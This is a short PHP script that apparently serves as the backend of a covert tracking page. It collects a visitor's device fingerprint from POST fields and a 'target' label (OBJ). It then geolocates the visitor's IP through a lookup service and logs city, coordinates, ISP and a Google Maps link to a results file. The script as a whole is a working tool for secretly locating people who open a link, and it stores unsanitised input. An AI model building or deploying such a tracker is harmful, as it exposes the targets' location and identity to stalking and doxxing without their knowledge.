<?php
date_default_timezone_set('America/Lima');
header('Content-Type: text/html');
{
    $ptf = $_POST['Ptf'];
    $brw = $_POST['Brw'];
    $cc = $_POST['Cc'];
    $ram = $_POST['Ram'];
    $ven = $_POST['Ven'];
    $ren = $_POST['Ren'];
    $ht = $_POST['Ht'];
    $wd = $_POST['Wd'];
    $os = $_POST['Os'];


    $obj = $_POST['Uis'];

    function getUserIP()
    {
        // Get real visitor IP
        if (isset($_SERVER["HTTP_CF_CONNECTING_IP"])) {
            $_SERVER['REMOTE_ADDR'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
            $_SERVER['HTTP_CLIENT_IP'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
        }
        $client = @$_SERVER['HTTP_CLIENT_IP'];
        $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
        $remote = $_SERVER['REMOTE_ADDR'];

        if (filter_var($client, FILTER_VALIDATE_IP)) {
            $ip = $client;
        } elseif (filter_var($forward, FILTER_VALIDATE_IP)) {
            $ip = $forward;
        } else {
            $ip = $remote;
        }
        return $ip;
    }

    $ip = getUserIP();
    //
    $data['dev'] = array();


    $xml = file_get_contents("http://free.ipwhois.io/json/" . $ip);
    $xml2 = explode('"', $xml);

    $f = fopen('result.txt', 'a+');
    fwrite($f, "#######FECHA Y HORA " . date("d-m-Y H:i:s") . "#######\n");
    fwrite($f, "------------INFORMACION DEL EQUIPO:--------------\n");
    fwrite($f, "------------------OBJ: " . $obj . "--------------\n");
    fwrite($f, "OS .........:	" . $os . "\n");
    fwrite($f, "Platform  ..:	" . $ptf . "\n");
    fwrite($f, "CPU Cores ..:	" . $cc . "\n");
    fwrite($f, "RAM ........:	" . $ram . "\n");
    fwrite($f, "GPU Vendor .:	" . $ven . "\n");
    fwrite($f, "GPU ........:	" . $ren . "\n");
    fwrite($f, "Resolutcion :	" . $ht . "x" . $wd . "\n");
    fwrite($f, "Navegador ..:	" . $brw . "\n");
    fwrite($f, "Ip Puplica .:	" . $ip . "\n\n");
    fwrite($f, "--------INFORMACION DE LA IP PUBLICA:------------\n");
    fwrite($f, "Ip Puplica .:	" . $ip . "\n");
    fwrite($f, "Pais .......:	" . $xml2[21] . "\n");
    fwrite($f, "Departamento:	" . $xml2[45] . "\n");
    fwrite($f, "Ciudad .....:	" . $xml2[49] . "\n");
    fwrite($f, "Latitud ....:	" . $xml2[53] . "\n");
    fwrite($f, "Longitud ...:	" . $xml2[57] . "\n");
    fwrite($f, "ORG ........:	" . $xml2[65] . "\n");
    fwrite($f, "ISP ........:	" . $xml2[69] . "\n\n");
    fwrite($f, "Google Maps.:   https://www.google.com/maps/place/" . $xml2[53] . "+" . $xml2[57] . "\n\n");
    fclose($f);
}
?>
